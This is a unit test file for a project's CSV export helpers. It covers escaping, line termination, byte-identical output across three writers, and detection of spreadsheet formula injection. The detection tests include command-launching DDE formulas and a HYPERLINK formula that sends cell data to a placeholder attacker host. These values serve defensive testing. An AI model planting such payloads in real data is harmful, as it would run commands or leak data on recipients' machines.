import { describe, it, expect } from 'vitest';
import {
  CSV_ROW_TERMINATOR,
  countFormulaRiskyCells,
  csvEscapeCell,
  csvRow,
  isFormulaRisky
} from '../../lib/utils/csv.js';
import { StreamingHandler } from '../../lib/utils/streaming-handler.js';
import { DatabaseToolsHandler } from '../../lib/tools/handlers/database-tools.js';
import { BaseToolHandler } from '../../lib/tools/handlers/base-handler.js';

// This module exists because there were two CSV writers that disagreed: the streaming one
// terminated rows with a literal backslash-n for a year while the non-streaming one was
// correct. These tests pin the format both now share.
describe('csv helpers', () => {
  describe('CSV_ROW_TERMINATOR', () => {
    it('is a real newline, not an escape sequence', () => {
      expect(CSV_ROW_TERMINATOR).toBe('\n');
      expect(CSV_ROW_TERMINATOR).toHaveLength(1);
      expect(CSV_ROW_TERMINATOR).not.toBe(String.raw`\n`);
    });
  });

  describe('csvEscapeCell', () => {
    it('renders null and undefined as an empty field, not as text', () => {
      expect(csvEscapeCell(null)).toBe('');
      expect(csvEscapeCell(undefined)).toBe('');
      expect(csvEscapeCell('')).toBe('');
    });

    it('leaves a field that needs no quoting unquoted', () => {
      expect(csvEscapeCell('plain')).toBe('plain');
      expect(csvEscapeCell(42)).toBe('42');
      expect(csvEscapeCell(false)).toBe('false');
      expect(csvEscapeCell(0)).toBe('0');
    });

    it('quotes on the delimiter, a quote, LF or CR, and doubles embedded quotes', () => {
      expect(csvEscapeCell('Doe, John')).toBe('"Doe, John"');
      expect(csvEscapeCell('say "hi"')).toBe('"say ""hi"""');
      expect(csvEscapeCell('a\nb')).toBe('"a\nb"');
      expect(csvEscapeCell('a\rb')).toBe('"a\rb"');
      expect(csvEscapeCell('a\r\nb')).toBe('"a\r\nb"');
    });

    it('does not mistake a literal backslash-n for a line break', () => {
      // The old predicate tested for this two-character sequence, so a field holding a REAL
      // newline went unquoted and split the record, while this one was quoted for nothing.
      expect(csvEscapeCell(String.raw`a\nb`)).toBe(String.raw`a\nb`);
    });
  });

  describe('csvRow', () => {
    it('joins cells with commas and ends with a real newline', () => {
      expect(csvRow(['a', 'b', 'c'])).toBe('a,b,c\n');
    });

    it('keeps a quoted line break inside its field rather than starting a record', () => {
      const row = csvRow(['one', 'two\nlines', 'three']);

      expect(row).toBe('one,"two\nlines",three\n');
      // Three physical lines, but exactly one record terminator at the very end.
      expect(row.endsWith('\n')).toBe(true);
      expect(row.slice(0, -1).split('\n')).toHaveLength(2);
    });

    it('emits an empty field per missing cell so the column count holds', () => {
      expect(csvRow([1, null, undefined, 4])).toBe('1,,,4\n');
    });
  });

  // Codex found a third CSV writer on #1244 after I had twice claimed there was only one.
  // These pin the property that matters: the three paths are one format, so they must agree
  // byte for byte, and a header is a field like any other.
  describe('one format across every writer', () => {
    const awkward = [
      { 'last,name': 'Doe, John', note: 'a\nb', cr: 'x\ry', quote: 'say "hi"' },
      { 'last,name': 'Jane', note: 'plain', cr: 'ok', quote: 'none' }
    ];

    it('escapes header names by the same rule as data fields', () => {
      // `last,name` unescaped emitted two header fields against one data field, so every
      // column after it was misaligned - a corruption no data-side quoting could fix.
      const header = csvRow(Object.keys(awkward[0])).trimEnd();

      expect(header).toBe('"last,name",note,cr,quote');
      expect(header.split(',')).toHaveLength(5); // 4 columns, one split inside the quoted name
    });

    it('terminates records with LF, a deliberate deviation from the RFC grammar', () => {
      // RFC 4180 says CRLF. We emit LF: it matches the writer that was already correct, keeps
      // stray CR out of MCP text responses, and every mainstream reader accepts it. Pinned so
      // the choice is visible rather than incidental.
      expect(CSV_ROW_TERMINATOR).toBe('\n');
      expect(csvRow(['a'])).not.toContain('\r');
    });

    it('quotes a field holding CR, which the RFC field rules do require', () => {
      expect(csvEscapeCell('x\ry')).toBe('"x\ry"');
    });

    // The property that actually matters, and the one I wrongly told a reviewer was already
    // covered: it is not enough for the shared helpers to be correct - all three writers have
    // to CALL them. Testing the helpers alone would still pass if a writer quietly grew its
    // own implementation again, which is exactly how this bug survived a year.
    it('produces byte-identical output from all three writers', () => {
      const streamed = new StreamingHandler().batchToCsv(awkward, {});
      const nonStreamed = DatabaseToolsHandler.prototype.recordsetToCsv.call(null, awkward);
      const formatted = BaseToolHandler.prototype.formatAsCsv.call(null, awkward)[0].text;

      expect(nonStreamed).toBe(streamed);
      expect(formatted).toBe(streamed);
    });

    it('serialises the whole awkward batch exactly, header escaping included', () => {
      const expected = [
        '"last,name",note,cr,quote',
        '"Doe, John","a\nb","x\ry","say ""hi"""',
        'Jane,plain,ok,none',
        ''
      ].join('\n');

      expect(new StreamingHandler().batchToCsv(awkward, {})).toBe(expected);
    });
  });

  describe('isFormulaRisky', () => {
    // The threat: a spreadsheet evaluates these as expressions on open, so a value that was
    // only ever data in the database becomes executable in the recipient's Excel.
    it('flags every leading character a spreadsheet evaluates', () => {
      expect(isFormulaRisky('=1+1')).toBe(true);
      expect(isFormulaRisky('+1')).toBe(true);
      expect(isFormulaRisky('@SUM(A1)')).toBe(true);
      expect(isFormulaRisky('\tcmd')).toBe(true);
      expect(isFormulaRisky('\rcmd')).toBe(true);
      expect(isFormulaRisky("=cmd|'/c calc'!A1")).toBe(true);
    });

    // The exemption that makes the check usable rather than noise. mssql hands back INT and
    // DECIMAL columns as JS numbers, so every negative value in the export arrives as a string
    // starting with `-`. Without this, a variance column fires on every row and the warning is
    // trained out of its reader within a handful of calls.
    it('exempts strict numeric literals, including negatives', () => {
      expect(isFormulaRisky(-1)).toBe(false);
      expect(isFormulaRisky('-1')).toBe(false);
      expect(isFormulaRisky('-1.5')).toBe(false);
      expect(isFormulaRisky('-1.5e3')).toBe(false);
      expect(isFormulaRisky('-1E-3')).toBe(false);
    });

    // The exemption must not become an escape hatch: a formula that merely opens with digits
    // is still a formula, and this is the boundary where a sloppy regex would let it through.
    it('does not exempt an expression that merely starts like a number', () => {
      expect(isFormulaRisky('-1+1')).toBe(true);
      expect(isFormulaRisky("-1+cmd|'/c calc'!A1")).toBe(true);
      expect(isFormulaRisky('-1 ')).toBe(true);
      expect(isFormulaRisky('--1')).toBe(true);
    });

    it('leaves ordinary values, blanks and positive numbers alone', () => {
      expect(isFormulaRisky('plain')).toBe(false);
      expect(isFormulaRisky('Doe, John')).toBe(false);
      expect(isFormulaRisky(42)).toBe(false);
      expect(isFormulaRisky(0)).toBe(false);
      expect(isFormulaRisky(false)).toBe(false);
      expect(isFormulaRisky('')).toBe(false);
      expect(isFormulaRisky(null)).toBe(false);
      expect(isFormulaRisky(undefined)).toBe(false);
    });

    // A trigger only counts in first position - `a=b` is data, and treating it as a formula
    // would flag a large share of ordinary text.
    it('only looks at the first character', () => {
      expect(isFormulaRisky('a=1+1')).toBe(false);
      expect(isFormulaRisky('total-1')).toBe(false);
    });

    // Quoting is RFC 4180 compliance, not a mitigation: the reader strips the quotes and
    // evaluates the field content. Pinned so nobody "fixes" this by widening MUST_QUOTE.
    it('is orthogonal to quoting - a quoted field is still evaluated', () => {
      expect(csvEscapeCell('=A1,B1')).toBe('"=A1,B1"');
      expect(isFormulaRisky('=A1,B1')).toBe(true);

      // And a leading tab is not even quoted today, so quoting could not have covered it.
      expect(csvEscapeCell('\tTAB')).toBe('\tTAB');
      expect(isFormulaRisky('\tTAB')).toBe(true);
    });
  });

  describe('countFormulaRiskyCells', () => {
    it('counts risky cells across every row', () => {
      const rows = [
        { id: 1, note: '=1+1' },
        { id: 2, note: 'plain' },
        { id: 3, note: '@SUM(A1)' }
      ];
      expect(countFormulaRiskyCells(rows)).toBe(2);
    });

    it('ignores the headers unless asked, since they are written only once', () => {
      const rows = [{ '=total': 1 }, { '=total': 2 }];

      expect(countFormulaRiskyCells(rows)).toBe(0);
      expect(countFormulaRiskyCells(rows, true)).toBe(1);
    });

    it('returns zero for an empty or absent batch', () => {
      expect(countFormulaRiskyCells([])).toBe(0);
      expect(countFormulaRiskyCells(undefined)).toBe(0);
      expect(countFormulaRiskyCells(null, true)).toBe(0);
    });

    it('does not fire on a table of ordinary negative numbers', () => {
      const ledger = [
        { account: 'ops', delta: -1 },
        { account: 'rnd', delta: -1250.75 },
        { account: 'cap', delta: 300 }
      ];
      expect(countFormulaRiskyCells(ledger, true)).toBe(0);
    });
  });

  // The whole policy in one assertion: detect, never rewrite.
  describe('the export is never modified to mitigate this', () => {
    it('serialises a formula-shaped value byte-for-byte', () => {
      const payload = '=HYPERLINK("http://attacker/?"&A1)';

      expect(isFormulaRisky(payload)).toBe(true);
      expect(csvEscapeCell(payload)).toBe('"=HYPERLINK(""http://attacker/?""&A1)"');
      expect(csvEscapeCell('-1')).toBe('-1');
      expect(csvRow(['=1+1', -1])).toBe('=1+1,-1\n');
    });
  });
});
